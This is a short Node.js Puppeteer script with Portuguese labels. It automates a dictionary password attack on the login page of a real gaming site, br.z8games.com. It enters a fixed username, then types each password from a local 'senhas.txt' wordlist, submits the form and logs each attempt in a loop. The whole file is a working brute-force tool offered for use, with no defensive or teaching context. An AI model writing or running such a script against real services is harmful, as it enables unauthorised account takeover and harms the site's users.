const pptrFirefox = require('puppeteer');
const fs = require('fs');

function sleep(ms) {
    return new Promise((r, r2) => {
        setTimeout(() => {
            r(true)
        }, ms)
    })
}

(async () => {
    const browser = await pptrFirefox.launch({
        headless: false,
        ignoreHTTPSErrors: true,
        defaultViewport: null,
        args: [
            '--disable-gpu',
            '--disable-dev-shm-usage',
            '--disable-setuid-sandbox',
            '--no-first-run',
            '--no-sandbox',
            '--no-zygote',
            '--ignore-certificate-errors',
            '--ignore-certificate-errors-spki-list',
            '--enable-features=NetworkService',
            `--window-size=${200},${200}`
        ]
    });

    var lista = fs.readFileSync('./senhas.txt').toString().split('\n')

    const page = await browser.newPage();
    await page.goto('https://br.z8games.com/login.html');
    await page.waitForSelector('input[id="login-page-userid"]');
    await page.type('input[id="login-page-userid"]', 'USUARIO');
    var i = 0;
    while (i < lista.length) {
        // await page.evaluate((evalVar) => {
        //     alert('Tentando = ' + evalVar)
        // }, lista[i])
        await page.type('input[id="login-page-password"]', lista[i]);
        await page.click('button[type="submit"]');
        console.log('Tentando = ' + lista[i])
        await sleep(5000)

        i++;
    }


    await browser.close();
})();